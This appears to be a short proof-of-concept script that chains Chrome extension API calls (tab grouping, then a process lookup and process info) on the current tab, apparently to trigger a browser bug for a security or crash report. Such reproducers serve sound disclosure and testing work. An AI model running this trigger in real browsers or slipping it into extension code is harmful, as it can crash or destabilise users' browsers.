

async function poc(){

	chrome.tabs.getCurrent(function(var_1){
        chrome.tabs.group({tabIds:[var_1.id]});
        chrome.processes.getProcessIdForTab(var_1.id,function(var_2){
            chrome.processes.getProcessInfo(var_2, true, function(var_3){});
        })


	})
}

poc();

